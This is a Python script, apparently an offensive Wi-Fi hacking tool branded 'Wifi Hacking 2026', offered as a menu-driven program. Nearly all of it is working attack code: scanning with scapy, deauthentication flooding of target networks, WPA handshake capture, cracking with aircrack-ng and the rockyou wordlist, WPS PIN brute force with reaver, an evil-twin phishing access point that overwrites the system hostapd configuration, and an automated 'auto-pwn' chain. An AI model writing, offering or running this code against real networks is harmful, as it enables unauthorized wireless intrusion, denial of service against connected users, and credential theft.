#!/usr/bin/env python3
#  Wi-Fi Attack Framework - 2026
import os
import sys
import time
import subprocess
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
import pywifi
from pywifi import const
import json

INTERFACE = "wlan0mon"  # Set your monitor interface
HANDSHAKE_DIR = "./handshakes/"
DICTIONARY = "/usr/share/wordlists/rockyou.txt"

if not os.path.exists(HANDSHAKE_DIR):
    os.makedirs(HANDSHAKE_DIR)

# === 1. Monitor Mode Setup ===
def enable_monitor_mode(interface):
    print("[*] Enabling monitor mode...")
    os.system(f"sudo ip link set {interface.replace('mon', '')} down")
    os.system(f"sudo iw dev {interface.replace('mon', '')} set type monitor")
    os.system(f"sudo ip link set {interface.replace('mon', '')} up")
    print(f"[+] Monitor mode enabled on {interface}")

# === 2. Scan Networks ===
def scan_networks(timeout=10):
    networks = {}
    print("[*] Scanning for nearby Wi-Fi networks...\n")
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode()
            bssid = pkt[Dot11].addr2
            channel = int(ord(pkt[Dot11Elt:3].info))
            crypto = pkt.sprintf("%Dot11Beacon.cap%")
            if 'privacy' in crypto.lower():
                enc = "WPA/WPA2"
            else:
                enc = "OPEN"
            if bssid not in networks:
                networks[bssid] = {'SSID': ssid, 'Channel': channel, 'Encryption': enc}
                print(f"SSID: {ssid} | BSSID: {bssid} | CH: {channel} | ENC: {enc}")

    sniff(prn=packet_handler, timeout=timeout, iface=INTERFACE)
    return networks

# === 3. Deauth Attack ===
def deauth_attack(bssid, client='ff:ff:ff:ff:ff:ff', iface=INTERFACE, count=50):
    print(f"[*] Launching deauth attack on {bssid} (Client: {client})")
    packet = RadioTap() / Dot11(addr1=client, addr2='00:11:22:33:44:55', addr3=bssid) / Dot11Deauth()
    sendp(packet, count=count, iface=iface, verbose=0)
    print("[+] Deauth packets sent. Wait for handshake...")

# === 4. Capture Handshake (Passive Sniff) ===
def capture_handshake(bssid, channel, timeout=30):
    print(f"[*] Sniffing for handshake on BSSID: {bssid}, Channel: {channel}")
    os.system(f"sudo iw dev {INTERFACE} set channel {channel}")
    handshake_file = f"{HANDSHAKE_DIR}{bssid.replace(':', '')}.pcap"
    
    def stop_filter(pkt):
        return pkt.haslayer(EAPOL)

    pkts = sniff(iface=INTERFACE, timeout=timeout, lfilter=stop_filter)
    if pkts:
        wrpcap(handshake_file, pkts)
        print(f"[+] Handshake captured and saved to {handshake_file}")
        return handshake_file
    else:
        print("[-] No handshake captured.")
        return None

# === 5. Crack WPA Handshake ===
def crack_handshake(handshake_file, ssid, wordlist=DICTIONARY):
    print(f"[*] Cracking handshake for {ssid} using {wordlist}")
    cmd = f"aircrack-ng {handshake_file} -w {wordlist} --bssid {ssid}"
    os.system(cmd)

# === 6. WPS PIN Brute Force (Reaver Alternative) ===
def wps_brute(bssid, iface=INTERFACE):
    print(f"[*] Starting WPS PIN brute force on {bssid}")
    cmd = f"reaver -i {iface} -b {bssid} -vv -K 1 -t 5"
    os.system(cmd)

# === 7. Fake AP + Evil Twin Phishing ===
def start_evil_twin(ssid, password=None):
    print(f"[!] Starting Evil Twin AP: {ssid}")
    os.system("sudo systemctl stop dnsmasq hostapd")
    config = f"""
interface=wlan0
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={password if password else '12345678'}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
    """
    with open("/etc/hostapd/hostapd.conf", "w") as f:
        f.write(config)
    print("[+] Config written. Starting AP...")
    os.system("sudo hostapd /etc/hostapd/hostapd.conf &")
    print("[+] Evil Twin AP running. Use MITM tools to harvest credentials.")

# === 8. Automated Full Attack ===
def auto_pwn_network(bssid, ssid, channel):
    print(f"[*] AUTO-PWN INITIATED: {ssid} ({bssid})")
    deauth_thread = threading.Thread(target=deauth_attack, args=(bssid,))
    deauth_thread.start()
    
    time.sleep(2)
    handshake_file = capture_handshake(bssid, channel, timeout=45)
    deauth_thread.join()

    if handshake_file:
        crack_handshake(handshake_file, bssid)
    else:
        print("[!] No handshake. Falling back to WPS...")
        wps_brute(bssid)

# === 9. Main Menu ===
def main():
    print("""
    ╔══════════════════════════════════════╗
    ║         🔥 Wifi Hacking 2026         ║
    ║         Owned by MR.Sabaz ali khan   ║
    ╚══════════════════════════════════════╝
    """)
    enable_monitor_mode(INTERFACE)
    
    while True:
        print("\n[+] Select Mode:")
        print("1. Scan Networks")
        print("2. Deauth Attack")
        print("3. Capture Handshake")
        print("4. Crack Handshake")
        print("5. WPS Brute Force")
        print("6. Wifi Twin (Phishing)")
        print("7. Auto-PWN (Full Exploit)")
        print("0. Exit")

        choice = input("\n> ")

        if choice == "1":
            scan_networks()
        elif choice == "2":
            bssid = input("Target BSSID: ")
            client = input("Client MAC (or ff:ff:ff:ff:ff:ff): ")
            deauth_attack(bssid, client)
        elif choice == "3":
            bssid = input("Target BSSID: ")
            channel = int(input("Channel: "))
            capture_handshake(bssid, channel)
        elif choice == "4":
            hfile = input("Handshake PCAP path: ")
            bssid = input("BSSID: ")
            crack_handshake(hfile, bssid)
        elif choice == "5":
            bssid = input("Target BSSID: ")
            wps_brute(bssid)
        elif choice == "6":
            ssid = input("Fake SSID: ")
            pwd = input("Fake Password (optional): ")
            start_evil_twin(ssid, pwd)
        elif choice == "7":
            bssid = input("Target BSSID: ")
            ssid = input("SSID: ")
            channel = int(input("Channel: "))
            auto_pwn_network(bssid, ssid, channel)
        elif choice == "0":
            print("[!] Shutting down...")
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        sys.exit(0)